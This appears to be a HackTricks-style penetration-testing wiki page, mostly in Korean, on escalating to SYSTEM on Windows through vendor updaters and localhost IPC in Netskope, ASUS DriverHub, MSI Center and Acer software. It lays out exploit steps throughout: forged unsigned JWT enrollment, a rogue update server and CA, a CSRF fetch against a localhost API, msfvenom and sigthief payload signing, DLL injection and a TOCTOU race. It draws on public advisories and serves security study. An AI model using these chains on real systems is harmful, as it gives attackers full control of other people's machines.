# 엔터프라이즈 자동 업데이트 및 권한 있는 IPC 악용 (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 저마찰 IPC 인터페이스와 권한 있는 업데이트 플로우를 노출하는 엔터프라이즈 엔드포인트 에이전트 및 업데이터들에서 발견되는 Windows 로컬 권한 상승 체인 범주를 일반화합니다. 대표적인 예로 Netskope Client for Windows < R129 (CVE-2025-0309)가 있으며, 여기서 낮은 권한의 사용자는 enrollment를 공격자 제어 서버로 강제한 뒤 SYSTEM 서비스가 설치하는 악성 MSI를 전달할 수 있습니다.

비슷한 제품에 재사용할 수 있는 주요 아이디어:
- 권한 있는 서비스의 localhost IPC를 악용해 공격자 서버로의 재등록 또는 재구성을 강제한다.
- 벤더의 업데이트 엔드포인트를 구현하고 악성 Trusted Root CA를 배포한 뒤, 업데이트 프로그램을 악성 “서명된” 패키지로 가리킨다.
- 약한 서명자 검사(CN allow-lists), 선택적 digest 플래그, 느슨한 MSI 속성을 회피한다.
- IPC가 “암호화”되어 있다면, 레지스트리에 저장된 모두가 읽을 수 있는 머신 식별자에서 key/IV를 유도한다.
- 서비스가 호출자를 image path/process name으로 제한하면, 허용된 프로세스에 인젝션하거나 프로세스를 suspended 상태로 생성한 뒤 최소한의 thread-context 패치로 DLL을 부트스트랩한다.

---
## 1) localhost IPC를 통해 공격자 서버로의 등록 강제

많은 에이전트는 JSON을 사용해 localhost TCP로 SYSTEM 서비스와 통신하는 user-mode UI 프로세스를 포함합니다.

Netskope에서 관찰됨:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

익스플로잇 흐름:
1) 백엔드 호스트(e.g., AddonUrl)를 제어하는 클레임을 가진 JWT enrollment 토큰을 생성합니다. alg=None을 사용해 서명이 필요 없도록 합니다.
2) JWT와 tenant name을 포함해 provisioning 명령을 호출하는 IPC 메시지를 보냅니다:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 서비스가 등록/구성(enrollment/config)을 위해 악성 서버로 요청을 보내기 시작합니다. 예:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name\-based, originate the request from a allow\-listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Once the client talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA 인증서를 반환합니다. 서비스가 이를 Local Machine Trusted Root store에 설치합니다.
3) /v2/checkupdate → 악성 MSI와 가짜 버전을 가리키는 메타데이터를 제공합니다.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: 서비스가 Subject CN이 “netSkope Inc” 또는 “Netskope, Inc.”인지 여부만 확인할 수 있습니다. 악성 CA는 해당 CN을 가진 leaf를 발급해 MSI에 서명할 수 있습니다.
- CERT_DIGEST property: CERT_DIGEST라는 정상 MSI 속성을 포함하세요. 설치 시 강제되지 않습니다.
- Optional digest enforcement: 구성 플래그(예: check_msi_digest=false)가 추가 암호화 검증을 비활성화합니다.

Result: SYSTEM 서비스가 C:\ProgramData\Netskope\stAgent\data\*.msi에서 MSI를 설치해 NT AUTHORITY\SYSTEM으로 임의 코드를 실행합니다.

---
## 3) Forging encrypted IPC requests (when present)

R127부터 Netskope는 IPC JSON을 Base64처럼 보이는 encryptData 필드로 래핑했습니다. 리버스 결과, 키/IV가 모든 사용자가 읽을 수 있는 레지스트리 값에서 파생된 AES임이 드러났습니다:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

공격자는 암호화를 재현해 일반 사용자 계정에서 유효한 암호화된 명령을 보낼 수 있습니다. 일반적인 팁: 에이전트가 갑자기 IPC를 “암호화”하기 시작하면, HKLM 아래의 device ID, product GUID, install ID 등을 재료로 사용하는지 찾아보세요.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

일부 서비스는 TCP 연결의 PID를 확인하고 이미지 경로/이름을 Program Files 아래의 허용된 벤더 바이너리(예: stagentui.exe, bwansvc.exe, epdlp.exe)와 비교해 피어를 인증하려 합니다.

실용적인 우회 방법 두 가지:
- DLL injection을 허용된 프로세스(예: nsdiag.exe)에 수행하고 내부에서 IPC를 프록시합니다.
- 허용된 바이너리를 일시 중단된 상태로 실행한 뒤 CreateRemoteThread 없이 프록시 DLL을 부트스트랩(§5 참고)하여 드라이버가 강제하는 변조 규칙을 만족시킵니다.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

제품들은 종종 보호된 프로세스 핸들에서 위험한 권한을 제거하기 위해 minifilter/OB callbacks 드라이버(예: Stadrv)를 동봉합니다:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME를 제거합니다
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE로 제한합니다

이 제약을 준수하는 신뢰할 수 있는 user\-mode 로더:
1) 벤더 바이너리를 CREATE_SUSPENDED로 CreateProcess 합니다.
2) 여전히 얻을 수 있는 핸들을 확보합니다: 프로세스에 대해 PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 그리고 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT 권한(또는 알려진 RIP에서 코드를 패치할 경우에는 THREAD_RESUME만) 있는 스레드 핸들.
3) ntdll!NtContinue(또는 초기부터 매핑된 다른 thunk)를 LoadLibraryW로 당신의 DLL 경로를 호출한 다음 다시 점프하도록 하는 작은 스텁으로 덮어씁니다.
4) ResumeThread로 스텁을 트리거해 프로세스 내에서 DLL을 로드합니다.

이미 보호된 프로세스에 대해 PROCESS_CREATE_THREAD나 PROCESS_SUSPEND_RESUME을 사용하지 않았기 때문에(프로세스를 생성했으므로) 드라이버의 정책을 만족합니다.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) 은 rogue CA, 악성 MSI 서명 과정을 자동화하고 /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate 같은 필요한 엔드포인트를 제공합니다.
- UpSkope는 임의의(선택적으로 AES\-encrypted된) IPC 메시지를 제작할 수 있는 커스텀 IPC 클라이언트이며, 허용된 바이너리에서 시작하도록 suspended\-process 인젝션을 포함합니다.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub는 127.0.0.1:53000에서 브라우저 호출을 https://driverhub.asus.com에서 오는 것으로 기대하는 사용자 모드 HTTP 서비스(ADU.exe)를 제공합니다. Origin 필터는 Origin 헤더와 /asus/v1.0/*로 노출된 다운로드 URL에 대해 단순히 `string_contains(".asus.com")`을 수행합니다. 따라서 `https://driverhub.asus.com.attacker.tld`와 같은 공격자 제어 호스트는 검사를 통과하고 JavaScript에서 상태 변경 요청을 보낼 수 있습니다. 추가 우회 패턴은 [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)를 참조하세요.

실용적 흐름:
1) `.asus.com`을 포함하는 도메인을 등록하고 그곳에 악성 웹페이지를 호스팅합니다.
2) `fetch` 또는 XHR을 사용해 `http://127.0.0.1:53000`의 권한 있는 엔드포인트(예: `Reboot`, `UpdateApp`)를 호출합니다.
3) 핸들러가 기대하는 JSON 바디를 전송하세요 – 패킹된 frontend JS가 아래 스키마를 보여줍니다.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
아래에 표시된 PowerShell CLI도 Origin header가 신뢰된 값으로 spoofed되면 성공합니다:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

흐름을 무기화하려면:
1) 페이로드를 생성합니다 (예: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS의 서명자를 페이로드에 클론합니다 (예: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe`를 `.asus.com` 유사 도메인에 호스팅하고 위의 브라우저 CSRF를 통해 UpdateApp을 트리거합니다.

Origin과 URL 필터가 모두 substring\-based이고 서명자 검사가 문자열 비교만 수행하기 때문에, DriverHub는 상승된 컨텍스트로 공격자 바이너리를 가져와 실행합니다.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker\-controlled arguments.

복사된 파일은 검증과 `ExecuteTask()` 사이에서 잠금되지 않습니다. 공격자는:
- 서명이 있는 합법적인 MSI 바이너리를 가리키는 Frame A를 보냅니다(서명 검사 통과와 작업 큐 등록을 보장).
- 반복되는 Frame B 메시지로 레이스하여 악성 페이로드를 가리키게 하고, 검증이 완료된 직후 `MSI Center SDK.exe`를 덮어씁니다.

스케줄러가 실행될 때, 원래 파일을 검증했음에도 불구하고 덮어써진 페이로드가 SYSTEM 권한으로 실행됩니다. 신뢰할 수 있는 익스플로잇은 TOCTOU 윈도우를 확보할 때까지 CMD_AutoUpdateSDK를 스팸하는 두 개의 goroutines/스레드를 사용합니다.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe`가 로드하는 모든 플러그인/DLL은 `HKLM\SOFTWARE\MSI\MSI_CentralServer`에 저장된 Component ID를 받습니다. 프레임의 처음 4바이트가 해당 컴포넌트를 선택하므로 공격자는 임의 모듈로 명령을 라우팅할 수 있습니다.
- 플러그인은 자체 task runner를 정의할 수 있습니다. `Support\API_Support.dll`는 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`를 노출하고 `API_Support.EX_Task::ExecuteTask()`를 직접 호출하며 **서명 검증이 없습니다** – 모든 로컬 사용자가 `C:\Users\<user>\Desktop\payload.exe`를 가리키면 결정론적으로 SYSTEM 실행을 얻을 수 있습니다.
- Wireshark로 loopback을 스니핑하거나 dnSpy로 .NET 바이너리에 인스트루먼트하면 Component ↔ command 매핑이 빠르게 드러나며, 이후 커스텀 Go/ Python 클라이언트로 프레임을 재생할 수 있습니다.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM)은 `\\.\pipe\treadstone_service_LightMode`를 노출하며, 그 재량 ACL은 원격 클라이언트(예: `\\TARGET\pipe\treadstone_service_LightMode`)를 허용합니다. 파일 경로와 함께 command ID `7`을 보내면 서비스의 프로세스 생성 루틴이 호출됩니다.
- 클라이언트 라이브러리는 인자와 함께 매직 종료 바이트(113)를 직렬화합니다. Frida/`TsDotNetLib`로 동적 인스트루먼트하면(인스트루먼트 팁은 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) 참조) 네이티브 핸들러가 이 값을 `SECURITY_IMPERSONATION_LEVEL`과 무결성 SID에 매핑한 다음 `CreateProcessAsUser`를 호출하는 것을 보여줍니다.
- 113 (`0x71`)을 114 (`0x72`)로 바꾸면 전체 SYSTEM 토큰을 유지하고 높은 무결성 SID(`S-1-16-12288`)를 설정하는 일반 분기로 떨어집니다. 따라서 생성된 바이너리는 로컬 및 교차 머신 모두에서 제약 없는 SYSTEM으로 실행됩니다.
- 이를 노출된 설치기 플래그(`Setup.exe -nocheck`)와 결합하면 랩 VM에서도 ACC를 설치하여 공급업체 하드웨어 없이 파이프를 테스트할 수 있습니다.

이러한 IPC 버그는 localhost 서비스가 상호 인증(ALPC SIDs, `ImpersonationLevel=Impersonation` 필터, 토큰 필터링)을 시행해야 하는 이유와 모든 모듈의 “run arbitrary binary” 헬퍼가 동일한 서명자 검증을 공유해야 하는 이유를 강조합니다.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
